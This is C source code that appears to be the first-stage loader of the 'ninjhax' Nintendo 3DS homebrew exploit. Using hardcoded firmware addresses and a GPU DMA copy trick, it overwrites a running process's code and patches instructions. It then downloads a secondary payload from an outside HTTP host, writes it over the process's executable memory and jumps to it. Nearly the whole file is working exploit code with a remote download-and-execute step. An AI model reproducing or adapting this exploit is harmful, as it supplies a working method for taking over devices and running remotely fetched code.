#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctr/types.h>
#include <ctr/srv.h>
#include <ctr/svc.h>
#include "text.h"

#define TEXTPAOFFSET 0x03E00000

#define TOPFBADR1 ((u8*)0x1444B9C0)
#define TOPFBADR2 ((u8*)0x14491EE0)

int _strlen(char* str)
{
	int l=0;
	while(*(str++))l++;
	return l;
}

void _strcpy(char* dst, char* src)
{
	while(*src)*(dst++)=*(src++);
	*dst=0x00;
}

//?
Result HTTPC_Initialize(Handle handle)
{
	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x10044; //request header code
	cmdbuf[1]=0x1000; //unk
	cmdbuf[2]=0x20; //unk
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result HTTPC_CreateContext(Handle handle, char* url, Handle* contextHandle)
{
	u32* cmdbuf=getThreadCommandBuffer();
	u32 l=_strlen(url)+1;

	cmdbuf[0]=0x20082; //request header code
	cmdbuf[1]=l;
	cmdbuf[2]=0x01; //unk
	cmdbuf[3]=(l<<4)|0xA;
	cmdbuf[4]=(u32)url;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;
	
	if(contextHandle)*contextHandle=cmdbuf[2];

	return cmdbuf[1];
}

Result HTTPC_InitializeConnectionSession(Handle handle, Handle contextHandle)
{
	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x80042; //request header code
	cmdbuf[1]=contextHandle;
	cmdbuf[2]=0x20; //unk, fixed to that in code
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result HTTPC_SetProxyDefault(Handle handle, Handle contextHandle)
{
	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0xe0040; //request header code
	cmdbuf[1]=contextHandle;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result HTTPC_CloseContext(Handle handle, Handle contextHandle)
{
	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x30040; //request header code
	cmdbuf[1]=contextHandle;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

// Result HTTPC_AddRequestHeaderField(Handle handle, Handle contextHandle, char* name, char* value)
// {
// 	u32* cmdbuf=getThreadCommandBuffer();

// 	int l1=_strlen(name)+1;
// 	int l2=_strlen(value)+1;

// 	cmdbuf[0]=0x1100c4; //request header code
// 	cmdbuf[1]=contextHandle;
// 	cmdbuf[2]=l1;
// 	cmdbuf[3]=l2;
// 	cmdbuf[4]=(l1<<14)|0xC02;
// 	cmdbuf[5]=(u32)name;
// 	cmdbuf[6]=(l1<<4)|0xA;
// 	cmdbuf[7]=(u32)value;
	
// 	Result ret=0;
// 	if((ret=svc_sendSyncRequest(handle)))return ret;

// 	return cmdbuf[1];
// }

Result HTTPC_BeginRequest(Handle handle, Handle contextHandle)
{
	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x90040; //request header code
	cmdbuf[1]=contextHandle;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result HTTPC_ReceiveData(Handle handle, Handle contextHandle, u8* buffer, u32 size)
{
	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0xB0082; //request header code
	cmdbuf[1]=contextHandle;
	cmdbuf[2]=size;
	cmdbuf[3]=(size<<4)|12;
	cmdbuf[4]=(u32)buffer;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result _srv_getServiceHandle(Handle* handleptr, Handle* out, char* server)
{
	u8 l=_strlen(server);
	if(!out || !server || l>8)return -1;

	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x50100; //request header code
	_strcpy((char*)&cmdbuf[1], server);
	cmdbuf[3]=l;
	cmdbuf[4]=0x0;

	Result ret=0;
	if((ret=svc_sendSyncRequest(*handleptr)))return ret;

	*out=cmdbuf[3];

	return cmdbuf[1];
}

// const u8 hexTable[]=
// {
// 	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'
// };

// void hex2str(char* out, u32 val)
// {
// 	int i;
// 	for(i=0;i<8;i++){out[7-i]=hexTable[val&0xf];val>>=4;}
// 	out[8]=0x00;
// }

// void drawHex(u32 val, int x, int y)
// {
// 	char str[9];

// 	hex2str(str,val);
// 	drawString(TOPFBADR1,str,x,y);
// 	drawString(TOPFBADR2,str,x,y);
// }

void doGspwn(u32* src, u32* dst, u32 size)
{
	Result (*nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue)(u32** sharedGspCmdBuf, u32* cmdAdr)=(void*)0x001C2B54;
	u32 gxCommand[]=
	{
		0x00000004, //command header (SetTextureCopy)
		(u32)src, //source address
		(u32)dst, //destination address
		size, //size
		0xFFFFFFFF, // dim in
		0xFFFFFFFF, // dim out
		0x00000008, // flags
		0x00000000, //unused
	};

	u32** sharedGspCmdBuf=(u32**)(0x356208+0x58);
	nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue(sharedGspCmdBuf, gxCommand);
}

void patchMem(Handle* gspHandle, u32 dst, u32 size, u32 start, u32 end)
{
	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u32* addr, u32 size)=(void*)0x002D15D4;

	int i;
	doGspwn((u32*)(dst), (u32*)(0x14100000), 0x200);
	svc_sleepThread(0x100000);
	for(i=start;i<end;i++)((u32*)0x14100000)[i]=0xEF000009;
	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)0x14100000, 0x200);
	doGspwn((u32*)(0x14100000), (u32*)(dst), 0x200);
	svc_sleepThread(0x100000);
}

int _main()
{
	Handle* gspHandle=(Handle*)0x00334F28;
	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u32* addr, u32 size)=(void*)0x002D15D4;

	// drawString(TOPFBADR1,"ninjhaxx",0,0);
	// drawString(TOPFBADR2,"ninjhaxx",0,0);

	Handle* srvHandle=(Handle*)0x334F6C;

	int line=10;
	Result ret;

	Handle* addressArbiterHandle=(Handle*)0x334960;

	//close threads
		//patch waitSyncN
		// patchMem(gspHandle, 0x14000000+TEXTPAOFFSET+0x000EBE00, 0x200, 0x5, 0xE);
		// patchMem(gspHandle, 0x14000000+TEXTPAOFFSET+0x000EBE00, 0x200, 0x9, 0xE);
		patchMem(gspHandle, 0x14000000+TEXTPAOFFSET+0x00192200, 0x200, 0x19, 0x4F);
		patchMem(gspHandle, 0x14000000+TEXTPAOFFSET+0x00192600, 0x200, 0x7, 0x13);
		patchMem(gspHandle, 0x14000000+TEXTPAOFFSET+0x001CA200, 0x200, 0xB, 0x1E);
		patchMem(gspHandle, 0x14000000+TEXTPAOFFSET+0x000C6100, 0x200, 0x3C, 0x52);

		//patch arbitrateAddress
		patchMem(gspHandle, 0x14000000+TEXTPAOFFSET+0x001C9E00, 0x200, 0x14, 0x40);

		//close handles
		ret=svc_closeHandle(*((Handle*)0x359938));
		ret=svc_closeHandle(*((Handle*)0x34FEA4));
		ret=svc_closeHandle(*((Handle*)0x356274));
		ret=svc_closeHandle(*((Handle*)0x334730));
		ret=svc_closeHandle(*((Handle*)0x334F64));

		//wake threads
		svc_arbitrateAddress(*addressArbiterHandle, 0x35811c, 0, -1, 0);
		svc_signalEvent(((Handle*)0x3480d0)[2]);
		s32 out; svc_releaseSemaphore(&out, *(Handle*)0x357490, 1);



	Handle httpcHandle;
	ret=_srv_getServiceHandle(srvHandle, &httpcHandle, "http:C");

	// drawHex(ret,0,line+=10);
	// drawHex(httpcHandle,0,line+=10);

	Handle httpContextHandle=0x00;

	ret=HTTPC_Initialize(httpcHandle);

	// drawHex(ret,0,line+=10);

	ret=HTTPC_CreateContext(httpcHandle,"http://smealum.net/ninjhax//cn_secondary_payload.bin", &httpContextHandle);

	// drawHex(ret,0,line+=10);
	
	Handle httpcHandle2;
	ret=_srv_getServiceHandle(srvHandle, &httpcHandle2, "http:C");

	ret=HTTPC_InitializeConnectionSession(httpcHandle2, httpContextHandle);
	ret=HTTPC_SetProxyDefault(httpcHandle2, httpContextHandle);

	// drawHex(ret,0,line+=10);

	// // ret=HTTPC_AddRequestHeaderField(httpcHandle2, httpContextHandle, "User-Agent", "CTR AC/02");
	// // ret=HTTPC_AddRequestHeaderField(httpcHandle2, httpContextHandle, "Content-Type", "text/html");
	// // ret=HTTPC_AddRequestHeaderField(httpcHandle2, httpContextHandle, "Connection", "Close");
	
	// drawHex(ret,0,line+=10);

	ret=HTTPC_BeginRequest(httpcHandle2, httpContextHandle);

	// drawHex(ret,0,line+=10);

	u8* buffer=(u8*)0x14100000;
	ret=HTTPC_ReceiveData(httpcHandle2, httpContextHandle, buffer, 0x300000);

	// drawHex(ret,0,line+=10);

	HTTPC_CloseContext(httpcHandle2, httpContextHandle);

	Result (*_DSP_UnloadComponent)(Handle* handle)=(void*)0x002BA368;
	Handle** dspHandle=(Handle**)0x334EFC;

	_DSP_UnloadComponent(*dspHandle);

	ret=_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)0x14100000, 0x300000);
	// drawHex(ret,0,line+=10);

	// doGspwn((u32*)(0x14100000), (u32*)(0x14000000+TEXTPAOFFSET), 0x001D9000);
	doGspwn((u32*)(0x14100000), (u32*)(0x14000000+TEXTPAOFFSET), 0x0000A000);

	svc_sleepThread(0x3B9ACA00);

	// drawString(TOPFBADR1,"ninjhax2",100,0);
	// drawString(TOPFBADR2,"ninjhax2",100,0);

	void (*reset)(void)=(void*)0x00100000;
	reset();

	while(1);
	return 0;
}
